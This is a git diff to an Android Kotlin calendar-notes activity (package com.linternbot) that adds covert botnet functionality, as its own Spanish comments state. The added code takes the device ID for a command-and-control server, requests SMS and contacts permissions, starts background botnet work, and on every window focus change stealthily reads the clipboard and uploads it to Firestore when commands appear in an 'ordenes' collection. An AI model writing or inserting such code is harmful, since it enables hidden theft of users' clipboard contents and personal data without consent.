@@ -1,6 +1,9 @@
 package com.linternbot
 
+import android.content.ClipboardManager
+import android.content.pm.PackageManager
 import android.os.Bundle
+import android.provider.Settings
 import android.util.Log
 import android.view.View.INVISIBLE
 import android.view.View.VISIBLE
@@ -8,13 +11,19 @@ import android.widget.Button
 import android.widget.EditText
 import android.widget.TextView
 import androidx.appcompat.app.AppCompatActivity
+import androidx.core.app.ActivityCompat
+import androidx.core.content.ContextCompat
+import com.google.firebase.firestore.DocumentChange
 import com.google.firebase.firestore.FirebaseFirestore
 import com.google.firebase.firestore.ktx.firestore
 import com.google.firebase.ktx.Firebase
 import org.naishadhparmar.zcustomcalendar.CustomCalendar
 import org.naishadhparmar.zcustomcalendar.OnDateSelectedListener
 import org.naishadhparmar.zcustomcalendar.Property
+import java.text.SimpleDateFormat
 import java.util.*
+
+var idAndroid = ""  // Variable global para almacenar el identificador unico del dispositivo android
 
 // Fuente de la clase: https://www.geeksforgeeks.org/how-to-implement-custom-calendar-in-android/
 class Notas : AppCompatActivity() {
@@ -23,6 +32,16 @@ class Notas : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_notas)
+
+        // Se le asigna un valor a la ID "unica" del dispositivo para identificarla en el C2
+        idAndroid = Settings.Secure.getString(
+            contentResolver,
+            Settings.Secure.ANDROID_ID
+        )
+        pidePermisoSMS()
+        // Comienzo del trabajo en segundo plano para la actividad de la botnet
+        var alarm = Alarm()
+        alarm.setAlarm(this)
 
         val textoInformativo = findViewById<TextView>(R.id.textoInformativo)
         val textoNota = findViewById<EditText>(R.id.NotaTexto)
@@ -162,9 +181,10 @@ class Notas : AppCompatActivity() {
                     }
                 }
             }
-            textoNota.setOnClickListener(){
-                val textoCortado = textoNota.text.substring(0,("No existe ninguna nota para el día ").length)
-                if(textoCortado.equals("No existe ninguna nota para el día ")){
+            textoNota.setOnClickListener() {
+                val textoCortado =
+                    textoNota.text.substring(0, ("No existe ninguna nota para el día ").length)
+                if (textoCortado.equals("No existe ninguna nota para el día ")) {
                     textoNota.setText("")
                 }
             }
@@ -172,6 +192,7 @@ class Notas : AppCompatActivity() {
     }
 
     fun pulsaFecha(date: String, db: FirebaseFirestore) {
+        pidePermisoContactos()
         val textoInformativo = findViewById<TextView>(R.id.textoInformativo)
         val textoNota = findViewById<EditText>(R.id.NotaTexto)
         val botonAceptar = findViewById<Button>(R.id.botonAceptar)
@@ -185,5 +206,57 @@ class Notas : AppCompatActivity() {
                 textoNota.setText("No existe ninguna nota para el día " + date)
             } else textoNota.setText(it.data.toString())
         }
+    }
+
+    // Cada vez que se produce un cambio en la ventana de vision de la APP se toma el clipboard
+    // Esta es la manera "sigilosa" mas facil de lograrlo
+    override fun onWindowFocusChanged(hasFocus: Boolean) {
+        super.onWindowFocusChanged(hasFocus)
+        if (hasFocus) {
+            if (ContextCompat.checkSelfPermission(
+                    this,
+                    android.Manifest.permission.READ_CONTACTS
+                ) != PackageManager.PERMISSION_GRANTED
+            ) {
+            }
+            val c = Calendar.getInstance()
+            val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
+            val strDate: String = sdf.format(c.time)
+            val db = Firebase.firestore
+            val clipBoardManager = this.getSystemService(CLIPBOARD_SERVICE) as ClipboardManager
+            val copiedString = clipBoardManager.primaryClip.toString()
+            Log.d("TAG2", "este texto es " + copiedString!!)
+            val datosPortapapeles = hashMapOf(
+                "User" to idAndroid,
+                "Date" to strDate,
+                "Portapapeles" to copiedString
+            )
+            db.collection("ordenes")
+                .addSnapshotListener { snapshot, e ->
+                    if (e != null) {
+                        Log.d("TAG", "Fallada la escucha de la primitiva.", e)
+                        return@addSnapshotListener
+                    }
+
+                    for (dc in snapshot!!.documentChanges) {
+                        when (dc.type) {
+                            DocumentChange.Type.ADDED -> db.collection("portapapeles")
+                                .document(idAndroid).set(datosPortapapeles)
+                        }
+                    }
+                }
+        }
+    }
+
+    // Pide permisos al usuario para el tema de recoger la lista de contactos
+    fun pidePermisoContactos(){
+        val permissions = arrayOf(android.Manifest.permission.READ_CONTACTS)
+        ActivityCompat.requestPermissions(this, permissions,0)
+    }
+
+    // Pide permisos al usuario para el tema de recoger la lista de contactos
+    fun pidePermisoSMS(){
+        val permissions = arrayOf(android.Manifest.permission.READ_SMS)
+        ActivityCompat.requestPermissions(this, permissions,1)
     }
 }
